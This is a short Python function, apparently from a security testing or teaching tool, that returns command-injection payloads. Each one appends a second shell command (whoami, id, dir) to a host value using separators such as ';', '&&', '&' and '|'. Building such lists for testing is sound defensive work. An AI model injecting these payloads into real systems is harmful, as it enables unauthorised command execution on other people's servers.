def generate_cmdi():

    payloads = [

        # Linux
        "127.0.0.1; whoami",
        "localhost && id",

        # Windows
        "127.0.0.1 & whoami",
        "localhost | dir",

        # Explanation Template
        "INPUT; COMMAND   # Separator bypass"

    ]

    return payloads
